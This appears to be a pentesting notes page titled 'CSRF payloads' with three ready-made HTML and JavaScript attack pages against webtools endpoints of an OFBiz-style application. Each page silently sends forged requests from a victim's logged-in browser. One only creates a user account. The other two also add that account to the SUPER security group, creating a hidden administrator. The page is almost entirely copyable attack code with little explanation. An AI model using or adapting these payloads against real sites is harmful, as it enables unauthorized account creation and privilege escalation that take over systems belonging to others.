---
title: CSRF payloads
layout: default
parent: CORS/CSRF
has_children: false
nav_order: 1
---

<h2>If it is just one request</h2>

1. Create a csrf.html with the following content:

```
<html>
<body onload="document.forms['csrf'].submit()">
  <form action="https://domain1/webtools/control/createUserLogin" method="post" name="csrf">
  <input type="hidden" name="enabled">
  <input type="hidden" name="partyId">
  <input type="hidden" name="userLoginId" value="csrftest">
  <input type="hidden" name="currentPassword" value="password">
  <input type="hidden" name="currentPasswordVerify" value="password">
  <input type="hidden" name="passwordHint">
  <input type="hidden" name="requirePasswordChange" value="N">
  <input type="hidden" name="externalAuthId">
  <input type="hidden" name="securityQuestion">
  <input type="hidden" name="securityAnswer">
  </form>
</body>
</html>
```

<h2>If got two or multiple requests(FETCH)</h2>

1. Create a csrf.html with the following content (note: no cors only support application/x-www-form-urlencoded):

```
<html>
<head>
<script>
  var username = "csrftest2";
  var password = "password";
  var host = "https://domain:port";
  var create_url = "/webtools/control/createUserLogin";
  var admin_url = "/webtools/control/userLogin_addUserLoginToSecurityGroup";
  var create_params = "enabled=&partyId=&userLoginId=" + username + "&currentPassword=" + password + "&currentPasswordVerify=" + password + "&passwordHint=hint&requirePasswordChange=N&externalAuthId=&securityQuestion=&securityAnswer=";
  var admin_params = "userLoginId=" +username + "&partyId=&groupId=SUPER&fromDate_i18n=&fromDate=&thruDate_i18n=&thruDate=";
function send_create() { 
  console.log("Creating user..."); 
  fetch(host+create_url, {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded'
    },
    body : create_params }
  ).then(function(response) {
    send_admin();
  }); 
}
function send_admin() { 
  console.log("Adding admin role..."); 
  fetch(host+admin_url, {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded' 
    },
    body : admin_params }
  ).then(
    console.log("Should be done...") 
  );
}
send_create();
</script>
</head>
<body></body>
</html>
```


<h2>If got two or multiple requests(FORM)</h2>

1. Create a csrf.html with the following content (this one doesnt have no-cors, but the request might not be sent in sequence):

```
<html>
<head>
<script>
  function submitForms() {
    document.forms['csrf'].submit();
    document.forms['csrf2'].submit();
    return false;
  }
</script>
</head>
<body onload="submitForms();" >
<body onload="document.forms['csrf'].submit()">
  <form action="https://domain/webtools/control/createUserLogin" method="post" name="csrf">
  <input type="hidden" name="enabled">
  <input type="hidden" name="partyId">
  <input type="hidden" name="userLoginId" value="csrftest">
  <input type="hidden" name="currentPassword" value="password">
  <input type="hidden" name="currentPasswordVerify" value="password">
  <input type="hidden" name="passwordHint">
  <input type="hidden" name="requirePasswordChange" value="N">
  <input type="hidden" name="externalAuthId">
  <input type="hidden" name="securityQuestion">
  <input type="hidden" name="securityAnswer">
  </form>
  <form action="https://domain/webtools/control/userLogin_addUserLoginToSecurityGroup" method="post" name="csrf2" target="_blank">
  <input type="hidden" name="userLoginId" value="csrftest">
  <input type="hidden" name="partyId">
  <input type="hidden" name="groupId" value="SUPER">
  <input type="hidden" name="fromDate_i18n">
  <input type="hidden" name="fromDate">
  <input type="hidden" name="thruDate_i18n">
  <input type="hidden" name="thruDate">
</form>
</body>
</html>
```